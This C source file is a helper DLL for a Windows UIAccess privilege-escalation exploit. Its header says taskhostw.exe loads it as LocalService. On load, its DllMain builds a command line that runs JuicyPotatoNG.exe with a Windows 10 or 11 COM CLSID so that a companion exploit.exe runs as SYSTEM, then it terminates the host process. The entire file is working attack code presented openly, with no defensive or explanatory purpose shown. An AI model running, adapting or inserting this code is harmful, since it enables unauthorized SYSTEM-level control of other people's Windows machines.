// File: uiaccess_exploit_dll.c
// Compiled: uiaccess_exploit.dll
// Author: Sascha Meyer
// Description: Helper DLL for the UIAccess exploit. Gets loaded by taskhostw.exe and runs as LocalService. This DLL runs JuicyPotatoNG to elevate futher to SYSTEM.

#define _CRT_SECURE_NO_WARNINGS

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include <windows.h>

// Win 10: {854A20FB-2D44-457D-992F-EF13785D2B51}
// Win 11: {A9819296-E5B3-4E67-8226-5E72CE9E1FB7}
#define CLSID "{A9819296-E5B3-4E67-8226-5E72CE9E1FB7}"

#ifdef __cplusplus
extern "C" {
#endif

__declspec(dllexport) BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	char tmp[128] = { 0 };
	char cmdline[1024] = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFOA si = { 0 };

	if (fdwReason == DLL_PROCESS_ATTACH)
	{
		if (GetSystemWindowsDirectoryA(tmp, sizeof(tmp)))
		{
			SetEnvironmentVariableA("systemroot", tmp);
			strcat(tmp, "\\ServiceProfiles\\LocalService");
			strcpy(cmdline, "\"");
			strcat(cmdline, tmp);
			strcat(cmdline, "\\JuicyPotatoNG.exe\" -t * -p \"");
			strcat(cmdline, tmp);
			strcat(cmdline, "\\exploit.exe\"");
			strcat(cmdline, " -c ");
			strcat(cmdline, CLSID);
			memset(&si, 0, sizeof(STARTUPINFOA));
			si.cb = sizeof(STARTUPINFOA);
			if (CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
			{
				CloseHandle(pi.hThread);
				CloseHandle(pi.hProcess);
			}
		}
		ExitProcess(0);
	}
	return TRUE;
}

#ifdef __cplusplus
}
#endif
